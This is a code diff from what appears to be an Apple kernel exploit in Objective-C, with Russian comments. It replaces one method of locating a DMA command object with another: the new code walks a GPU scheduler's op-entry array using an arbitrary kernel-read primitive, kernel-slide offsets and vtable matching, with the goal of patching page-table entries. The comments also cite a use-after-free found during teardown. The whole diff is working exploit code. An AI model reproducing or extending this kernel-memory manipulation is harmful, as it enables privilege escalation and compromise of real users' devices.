@@ -6658,71 +6658,33 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         // → DVA=[mapObj+0xa0] → pageIdx=DVA>>14 → walk L0/L1/L2/leaf (valid=bit0,
         // child=(e<<4)&0x3ffffffc000) → PTE. Патч ТОЛЬКО при совпадении PA-маски.
         uint64_t cmdVA = 0, dva = 0, dvaLen = 0;
-        // 1.9.168: op-entry ТРАНЗИТЕН (к фазе 2 наш оп исполнился и запись
-        // рециклирована — chain-B пуст). cmd живёт в ПЕРСИСТЕНТНОМ plane-struct
-        // (р.33/37: [plane-struct+0x90]=surface, [+0x98]=IODMACommand) — хант по
-        // указателям pipe/provider: [P+0x90]==surfVA. Затем cmd→mapObj+0xa0=DVA.
-        uint64_t planeStruct = 0;
-        {
-            uint64_t hosts[3] = { ucVA, provVA, pipeVA };
-            const char *hnames[3] = { "uc", "prov", "pipe" };
-            uint32_t hlims[3] = { 0x168, 0x200, 0x400 };
-            for (int src = 0; src < 3 && !planeStruct; src++) {
-                uint64_t host = hosts[src];
-                if (!kpLooksLikeKernelPointer(host) || !surfVA) continue;
-                for (uint32_t o = 0; o + 8 <= hlims[src] && !planeStruct; o += 8) {
-                    uint64_t P = kp_untag_ptr(early_kread64(host + o));
-                    if (!kpLooksLikeKernelPointer(P) || !kvtophys(P)) continue;
-                    if ((uint32_t)(P & 0x3fff) + 0xa0 > 0x4000) continue;
-                    if (kp_untag_ptr(early_kread64(P + 0x90)) != surfVA) continue;
-                    planeStruct = P;
-                    kpNote(r, [NSString stringWithFormat:@"  [P2] plane-struct @ %s+%#x = %#llx ([+0x90]=surfVA ✓)",
-                              hnames[src], o, (unsigned long long)P]);
-                }
-            }
-        }
-        // 1.9.169 уровень 2: struct может быть на уровень глубже (указатели в
-        // указателях pipe/prov) + явная проверка pipe+0xd8 (shadowMapper, р.32)
-        if (!planeStruct && surfVA) {
-            for (uint32_t src = 0; src < 2 && !planeStruct; src++) {
-                uint64_t host = src ? provVA : pipeVA;
-                if (!kpLooksLikeKernelPointer(host)) continue;
-                uint32_t lim5 = src ? 0x200 : 0x400;
-                for (uint32_t o = 0; o + 8 <= lim5 && !planeStruct; o += 8) {
-                    uint64_t P = kp_untag_ptr(early_kread64(host + o));
-                    if (!kpLooksLikeKernelPointer(P) || !kvtophys(P)) continue;
-                    if ((uint32_t)(P & 0x3fff) + 0x200 > 0x4000) continue;
-                    for (uint32_t o2 = 0; o2 + 8 <= 0x200; o2 += 8) {
-                        uint64_t P2 = kp_untag_ptr(early_kread64(P + o2));
-                        if (!kpLooksLikeKernelPointer(P2) || !kvtophys(P2)) continue;
-                        if ((uint32_t)(P2 & 0x3fff) + 0xa0 > 0x4000) continue;
-                        if (kp_untag_ptr(early_kread64(P2 + 0x90)) != surfVA) continue;
-                        planeStruct = P2;
-                        kpNote(r, [NSString stringWithFormat:@"  [P2] plane-struct lvl2 @ %s+%#x→%#llx+%#x = %#llx",
-                                  src ? "prov" : "pipe", o, (unsigned long long)P, o2, (unsigned long long)P2]);
-                        break;
+        // 1.9.170 (р.41): plane-struct INLINE в op-entry (ep+0x6f8 dst: surface
+        // ep+0x788, cmd ep+0x790 — поэтому хант указателем мимо был). Op-entry
+        // живёт в scheduler array: [pipe+0xb8] → [sched+0xc8]. Матч по
+        // [ep+0x788]==surfVA (credit после execute сброшен; записи висят в
+        // массиве и после completion — UAF-опыт teardown'а это доказал).
+        if (kpLooksLikeKernelPointer(pipeVA) && surfVA) {
+            uint64_t schVA = kp_untag_ptr(early_kread64(pipeVA + 0xb8));
+            uint64_t earr = kpLooksLikeKernelPointer(schVA) ? kp_untag_ptr(early_kread64(schVA + 0xc8)) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [P2] scheduler=%#llx arr=%#llx — матч записей по [ep+0x788]==surfVA",
+                      (unsigned long long)schVA, (unsigned long long)earr]);
+            if (kpLooksLikeKernelPointer(earr)) {
+                for (uint32_t i = 0; i < 384 && !cmdVA; i++) {
+                    uint64_t ep = kp_untag_ptr(early_kread64(earr + i * 8));
+                    if (!kpLooksLikeKernelPointer(ep) || !kvtophys(ep)) continue;
+                    if ((uint32_t)(ep & 0x3fff) + 0x798 > 0x4000) continue;
+                    if (kp_untag_ptr(early_kread64(ep + 0x788)) != surfVA) continue;
+                    kpNote(r, [NSString stringWithFormat:@"  [P2] наша запись [%u]=%#llx ([+0x788]=surfVA ✓)", i, (unsigned long long)ep]);
+                    uint64_t cand = kp_untag_ptr(early_kread64(ep + 0x790));
+                    if (kpLooksLikeKernelPointer(cand) && kvtophys(cand)) {
+                        uint64_t cvt = kp_untag_ptr(early_kread64(cand));
+                        uint64_t cFile = cvt ? cvt - kslide2 : 0;
+                        kpNote(r, [NSString stringWithFormat:@"  [P2] cmd=[ep+0x790]=%#llx vt(file)=%#llx%@",
+                                  (unsigned long long)cand, (unsigned long long)cFile,
+                                  (uint32_t)cFile == 0x7afa9e8 ? @" = IODMACommand ✓" : @""]);
+                        if ((uint32_t)cFile == 0x7afa9e8) cmdVA = cand;
                     }
                 }
-            }
-        }
-        if (!planeStruct && kpLooksLikeKernelPointer(pipeVA)) {
-            uint64_t sm = kp_untag_ptr(early_kread64(pipeVA + 0xd8));
-            kpNote(r, [NSString stringWithFormat:@"  [P2] pipe+0xd8(shadowMapper?)=%#llx", (unsigned long long)sm]);
-            if (kpLooksLikeKernelPointer(sm) && kvtophys(sm) && (uint32_t)(sm & 0x3fff) + 0xa0 <= 0x4000 &&
-                kp_untag_ptr(early_kread64(sm + 0x90)) == surfVA) {
-                planeStruct = sm;
-                kpNote(r, @"  [P2] plane-struct == pipe+0xd8 ✓");
-            }
-        }
-        if (planeStruct) {
-            uint64_t cand = kp_untag_ptr(early_kread64(planeStruct + 0x98));
-            if (kpLooksLikeKernelPointer(cand) && kvtophys(cand)) {
-                uint64_t cvt = kp_untag_ptr(early_kread64(cand));
-                uint64_t cFile = cvt ? cvt - kslide2 : 0;
-                kpNote(r, [NSString stringWithFormat:@"  [P2] cmd=[plane+0x98]=%#llx vt(file)=%#llx%@",
-                          (unsigned long long)cand, (unsigned long long)cFile,
-                          (uint32_t)cFile == 0x7afa9e8 ? @" = IODMACommand ✓" : @""]);
-                if ((uint32_t)cFile == 0x7afa9e8) cmdVA = cand;
             }
         }
         if (cmdVA) {
